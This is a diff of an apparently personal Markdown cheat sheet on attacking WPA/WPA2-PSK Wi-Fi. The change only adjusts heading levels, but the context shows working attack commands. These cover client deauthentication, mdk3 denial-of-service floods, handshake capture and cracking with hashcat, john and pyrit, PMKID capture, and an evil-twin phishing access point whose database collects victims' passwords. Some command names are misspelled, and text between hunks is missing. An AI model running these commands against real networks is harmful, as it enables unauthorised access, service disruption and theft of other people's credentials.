@@ -2,11 +2,11 @@
 title: Hacking Wifi - WPA/WPA2 PSK
 ---
 
-# Introduction
+## Introduction
 
 ![WPA2-PSK Message Exchange](../images/wpa_psk.png)
 
-# Setup
+## Setup
 
 ```
 sudo airmon-ng check kill
@@ -33,9 +33,9 @@ Start capturing:
 sudo airodump-ng -c <CH> --bssid <BSSID> [--band abg] --write <OUT_FILE> <IFACE>
 ```
 
-# Handshake Capture (Clients needed)
+## Handshake Capture (Clients needed)
 
-## Deauth
+### Deauth
 
 Consist on deauthenticate a client in order to capture de re-authentication handshake.
 
@@ -43,7 +43,7 @@ Consist on deauthenticate a client in order to capture de re-authentication hand
 aireplay-ng -0 10 -a <BSSID> -c <CLIENT> <IFACE>
 ```
 
-## Deauth Global
+### Deauth Global
 
 The same term of deauthentication, but in that case using the brodcast MAC address in order to deauthenticate all clients.
 
@@ -51,7 +51,7 @@ The same term of deauthentication, but in that case using the brodcast MAC addre
 airplay-ng -0 0 -e <ESSID> -c FF:FF:FF:FF:FF:FF <IFACE>
 ```
 
-## Auth attack or Authentication DoS Mode
+### Auth attack or Authentication DoS Mode
 
 Could be sound strange, but if you authenticate 5000 clients to the Access Point is possible to kick out client of the network and then capture their handshake.
 
@@ -65,7 +65,7 @@ mdk3 <IFACE> a -a <BSSID> #Authenticating clients until DoS
 
 Finally the AP will eject the clients with less power rate.
 
-## Dissassociation Amok Mode Attack
+### Dissassociation Amok Mode Attack
 
 Same as deauthentication attack but mdk3 gives us the opportunity to introduce `allow/deny` lists.
 
@@ -76,7 +76,7 @@ a0:e4:b2:45:f6:87
 mdk3 <IFACE> d -w blacklist.txt -c 1
 ```
 
-## Validating the handshake
+### Validating the handshake
 
 Sometimes `aircrack-ng` tells us that it capture a handshake when it hasn't. So we can validate it with `pyrit`.
 
@@ -84,7 +84,7 @@ Sometimes `aircrack-ng` tells us that it capture a handshake when it hasn't. So 
 pyrit -r Capture-01.cap analyze
 ```
 
-## Filtering the capture
+### Filtering the capture
 
 When we are trying to capture a handshake, maybe we are capturing a lot of packets, so we just need to filter that. `(EAPOL -> Handshakes) (wlan.fc.type_subtype==0x08 are Beacons) (wlan.fc.type\_subtype==0x05 are Probe Response)`
 
@@ -107,7 +107,7 @@ IF you want to do a doble analysis you may change `-Y` parameter to `-R "FILTER"
 tshark -r Capture-01.cap -R "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -2 -w filteredCapture -F pcap 2>/dev/null
 ```
 
-## Hash extraction
+### Hash extraction
 
 First we need to save our handshaek in HCCAP to after use `hccap2john` and crack it.
 
@@ -119,9 +119,9 @@ hccap2john capture.hccap > handshake.hash
 aricrack-ng -j capture Capture-01.cap   # For hashcat
 ```
 
-## Cracking the hanshake
+### Cracking the hanshake
 
-### Dictionary Attack
+#### Dictionary Attack
 
 ```
 john --wordlist=/usr/share/wordlist/rockyou.txt handshake.hash --format=wpapsk
@@ -133,7 +133,7 @@ hashcat -m 2500 -d 1 capture.hccapx /usr/share/wordlists/rockyou.txt --force -w 
 hashcat --show -m 2500 capture.hccapx
 ```
 
-### Rainbow Table
+#### Rainbow Table
 
 **Airolib + Aircrack**
 
@@ -191,9 +191,9 @@ pyrit batch
 pyrit -r Captura-01.cap attack_db  #Up to 20M/s
 ```
 
-# DoS attacks
+## DoS attacks
 
-### CTS Frame Attack
+#### CTS Frame Attack
 
 The protocol 802.11 is CSMA CA, CA is Collision Avoidance, so in that protocol appear two new types of packets. CTS (Clear to Send) and RTS (Request to Send) that provides to the network the ability to avoid collisions between frames.
 
@@ -222,7 +222,7 @@ $$
 Time Busy = 10.000 packets * 30.000 us = 30s
 $$
 
-### Beacon Flood Mode Attack
+#### Beacon Flood Mode Attack
 
 The beacon frame is a frame that contains information about the access point such as the channel where the AP is working, ciphers, protocols, etc.
 
@@ -246,7 +246,7 @@ MyNetwork10
 mdk3 <IFACE> b -f networks.txt -a -s 1000 -c <CHANNEL>   # -a -> WPA2  -s <speed>
 ```
 
-### Michael Shutdown Explotation
+#### Michael Shutdown Explotation
 
 Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets, but less effective.
 
@@ -254,7 +254,7 @@ Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 i
 mdk3 <IFACE> m -t <BSSID>
 ```
 
-# Evil Twin
+## Evil Twin
 
 One of the most common techniques to obtain the password of a wireless network via phishing. It's common that the devices emit Probe Request frames when their are not associated to any AP. These Probe Request frame ares packets that contain information about which SSID the device was connected before. So we can abuse of that information in order to create a Fake AP with the same SSID.
 
@@ -264,7 +264,7 @@ thark -i <IFACE> -Y "wlan.fc.type_subtype==4" 2>/dev/null
     2 0.019968349 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
 ```
 
-## Creating DHCP file
+### Creating DHCP file
 
 /etc/dhcpd.conf
 
@@ -281,7 +281,7 @@ range 192.168.1.130 192.168.1.140;
 }
 ```
 
-## Configuring the web page (LOGIN ROUTER WIFI)
+### Configuring the web page (LOGIN ROUTER WIFI)
 
 Search and copy the html of a login webpage with the following action form:
 
@@ -327,7 +327,7 @@ ob_end_flush();
 ?>
 ```
 
-## Initializazing services
+### Initializazing services
 
 We need to start apache2 and mysql
 
@@ -335,11 +335,11 @@ We need to start apache2 and mysql
 service apache2 start && service mysql start
 ```
 
-## Configuring MySQL
+### Configuring MySQL
 
 As we can see in `dbconnect.php` it's trying to connect to a `evilTwin` db with `fakeap` user, so we just need to configure mysql properly.
 
-### Creating the DB
+#### Creating the DB
 
 ```
 mysql -u root
@@ -367,7 +367,7 @@ select * from sniff;
 1 row in set (0.00 sec)
 ```
 
-### Creating a user for the DB
+#### Creating a user for the DB
 
 ```
 mysql -u root
@@ -379,7 +379,7 @@ FLUSH PRIVILEGES;
 
 At this point onced we introduced credentials via the web panel, it will be appended in our database.
 
-## Creating the AP
+### Creating the AP
 
 With `airbase` we can set up our fake AP without authentication:
 
@@ -387,7 +387,7 @@ With `airbase` we can set up our fake AP without authentication:
 airbase-ng -e <ESSID> -c <CHANNEL> -P <IFACE>
 ```
 
-### Configuring a new network interface
+#### Configuring a new network interface
 
 Onced launched our new fake AP, we need to add a new network interface.
 
@@ -409,7 +409,7 @@ at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-### Configuring IP tables
+#### Configuring IP tables
 
 The idea is to redirect the traffic coming from victims from at0 to eth0 in order to give them connection to internet.
 
@@ -425,7 +425,7 @@ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostn
 iptables -t nat -A POSTROUTING -j MASQUERADE
 ```
 
-### Syncronize
+#### Syncronize
 
 Finally the last step is syncronize our rules to the fake AP.
 
@@ -433,15 +433,15 @@ Finally the last step is syncronize our rules to the fake AP.
 dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcp.pid at0
 ```
 
-# Attacks without Clients
+## Attacks without Clients
 
 In this section we are not going to capture any type of handshake to obtain the hash or key. We are goin to attack the network in a client-less mode.
 
-## PKMID Attack
+### PKMID Attack
 
 This attack allows us to break the technology using Pairwise Master Key Identifier (PKMID) which is a characteristic available in a lot of devices.
 
-### Via Bettercap
+#### Via Bettercap
 
 The results will be exported on a pcap file.
 
@@ -454,7 +454,7 @@ iface >> wifi.show
 iface >> wifi.assoc all
 ```
 
-### Via hcxdumptool
+#### Via hcxdumptool
 
 Same as bettercap, the results will be exported on a pcap file.
 
@@ -462,7 +462,7 @@ Same as bettercap, the results will be exported on a pcap file.
 hcxdumptool -i <IFACE> -o <OUT_FILE> --enable_status=1
 ```
 
-### Export results fo hashcat && Cr4ck it!
+#### Export results fo hashcat && Cr4ck it!
 
 Using `hcxpcaptool` we can easily transform the output of bettercap or hcxdumptool to hashcat.
 
@@ -472,7 +472,7 @@ hcxpcaptool -z hashes.hash Capture.pcap
 hashcat -m 16800 -d 1 -w 3 hashesh.hash /usr/share/wordslist/rockyou.txt
 ```
 
-## WPS Attack
+### WPS Attack
 
 Wifi Protected Setup aka WPS is a wireless network security standard that tries to make connections between a router and devices faster and easier.
 
